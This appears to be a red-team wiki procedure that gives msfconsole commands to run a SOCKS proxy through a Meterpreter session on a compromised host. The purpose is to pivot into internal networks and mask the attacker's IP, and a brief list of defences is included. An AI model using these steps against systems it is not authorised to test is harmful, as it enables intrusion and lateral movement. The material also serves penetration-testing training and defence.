---
type: procedure
description: >-
  Configure a SOCKS proxy through an active Meterpreter session to pivot traffic
  via a compromised host.
verified: true
submitted: false
tactics:
  - '[[Command and Control]]'
techniques:
  - '[[Connection Proxy]]'
sub_techniques: []
tags:
  - metasploit
  - meterpreter
  - socks-proxy
  - pivoting
  - command-and-control
commands:
  - '[[commands/msfconsole-use-socks-proxy-module]]'
  - '[[commands/msfconsole-set-srvport]]'
  - '[[commands/msfconsole-set-session]]'
  - '[[commands/msfconsole-run-socks-proxy]]'
  - '[[commands/msfconsole-setg-proxies]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Setup-Meterpreter-SOCKS-Proxy

## Summary

This procedure sets up a SOCKS4 proxy using an active Meterpreter session on a compromised host, enabling attackers to route network traffic through the target to reach internal resources. It is commonly used for pivoting during lateral movement, scanning hidden networks, and maintaining anonymity by masking the attacker's true IP address.

## Description

The Meterpreter SOCKS proxy leverages Metasploit's auxiliary/server/socks_proxy module to create a dynamic proxy tunnel. Once configured, traffic from the attacker's machine (or Metasploit modules) is forwarded through the compromised host, allowing access to otherwise unreachable internal systems. This technique supports protocols like TCP and is particularly effective in segmented networks. The target environment typically involves a host already compromised with a Meterpreter payload (e.g., via reverse shell). Success results in a functional proxy that can be verified by testing connectivity to internal IPs from external tools like nmap or curl, routed via the proxy.

## Requirements

1. Metasploit Framework installed and msfconsole running
2. An active Meterpreter session on the compromised target (obtain session ID via `sessions -l`)
3. Administrative or equivalent access on the attacker's machine to run Metasploit
4. No local firewall blocking the proxy port (default 1080) on the attacker's side
5. Network connectivity between attacker and compromised host

## Defense

- Deploy endpoint detection and response (EDR) tools to identify Meterpreter processes and anomalous network patterns
- Implement strict network segmentation with micro-segmentation to limit lateral movement
- Monitor for unexpected SOCKS or proxy traffic from internal hosts using tools like Zeek or Suricata
- Enforce least privilege and disable unnecessary services to prevent initial compromise leading to Meterpreter implantation
- Regularly audit Metasploit-like tools and block their C2 domains/IPs at the perimeter

## Objectives

1. Establish a persistent SOCKS proxy tunnel through the compromised host
2. Configure Metasploit modules to automatically route traffic via the proxy
3. Enable pivoting for further reconnaissance or exploitation of internal networks
4. Verify proxy functionality without direct exposure of the attacker's location

## Instructions

### Step 1: Load the SOCKS Proxy Module

**Context**: Begin by selecting the Metasploit module that hosts the SOCKS proxy server. This module will bind to a local port and use the Meterpreter session for forwarding traffic to the target network.

**Command** ([[commands/msfconsole-use-socks-proxy-module]]):
```msfconsole
use auxiliary/server/socks_proxy
```

> This command loads the module into the current msfconsole session. Expected output includes confirmation like "[*] auxiliary/server/socks_proxy - SOCKS Proxy Server" and the module's options displayed.

### Step 2: Configure the Listening Port

**Context**: Define the local port on the attacker's machine where the SOCKS proxy will listen for incoming connections. Port 1080 is standard for SOCKS4; choose an unused port if needed to avoid conflicts.

**Command** ([[commands/msfconsole-set-srvport]]):
```msfconsole
set SRVPORT 1080
```

> Updates the SRVPORT option. Expected output: "SRVPORT => 1080". If the port is in use, Metasploit will warn during startup; select an alternative if necessary.

### Step 3: Assign the Meterpreter Session

**Context**: Link the proxy to the specific Meterpreter session on the compromised host. This ensures all proxied traffic is routed through that session's host. Use `sessions -l` beforehand to list available sessions and note the ID.

**Command** ([[commands/msfconsole-set-session]]):
```msfconsole
set SESSION 1
```

> Replace `1` with your actual session ID. Expected output: "SESSION => 1". Verify with `show options` to confirm the setting.

### Step 4: Launch the SOCKS Proxy Server

**Context**: Start the proxy as a background job in Metasploit. This begins listening on the configured port and prepares the tunnel through the Meterpreter session.

**Command** ([[commands/msfconsole-run-socks-proxy]]):
```msfconsole
exploit -j
```

> The `-j` flag runs it as a job. Expected output: "[*] Started SOCKS proxy server on 0.0.0.0:1080" and a job ID (e.g., "[*] Auxiliary JOB 1 started"). Check jobs with `jobs` to ensure it's running.

### Step 5: Set Global Proxy Configuration

**Context**: Apply the proxy settings globally across all Metasploit modules and sessions. This ensures subsequent scans, exploits, or other actions automatically use the SOCKS tunnel without per-module configuration.

**Command** ([[commands/msfconsole-setg-proxies]]):
```msfconsole
setg Proxies socks4:127.0.0.1:1080
```

> The `setg` (set global) command persists the setting. Expected output: "Proxies => socks4:127.0.0.1:1080". Verify with `getg Proxies`. Note: Use `socks5` if the module supports SOCKS5 for UDP traffic.
